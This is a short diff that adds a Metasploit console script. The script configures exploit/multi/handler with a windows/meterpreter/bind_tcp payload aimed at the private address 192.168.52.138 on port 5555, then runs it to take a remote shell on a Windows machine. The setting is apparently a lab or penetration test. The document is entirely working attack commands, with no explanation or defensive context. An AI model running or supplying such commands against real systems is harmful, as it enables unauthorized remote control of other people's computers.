@@ -1,0 +1,5 @@
+use exploit/multi/handler 
+set payload windows/meterpreter/bind_tcp
+set rhost 192.168.52.138
+set lport 5555
+run
